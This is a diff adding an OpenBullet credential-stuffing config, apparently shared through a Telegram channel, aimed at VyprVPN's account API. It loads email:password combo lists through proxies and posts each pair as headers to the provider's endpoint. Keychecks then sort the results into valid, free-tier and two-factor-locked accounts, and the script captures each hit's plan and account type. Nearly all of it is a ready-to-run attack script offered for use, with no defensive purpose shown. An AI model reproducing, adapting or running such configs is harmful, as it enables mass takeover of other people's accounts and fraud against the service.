@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "VyprVPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-26T07:07:55.1168931-05:00",
+  "AdditionalInfo": "Telegram Channel: @OpenBulletChannel | Capture | CPM Rate: 100_3000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Post REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "User-Agent: okhttp/3.12.1" 
+  HEADER "username: <USER>" 
+  HEADER "password: <PASS>" 
+
+#KKKK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "\"confirmed\": true," 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"vpn\": null" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\"locked\"" 
+
+#Plan PARSE "<SOURCE>" JSON "account_level_display" CreateEmpty=FALSE -> CAP "Plan" 
+
+#Account_Type PARSE "<SOURCE>" JSON "account_level" CreateEmpty=FALSE -> CAP "Account Type" 
+
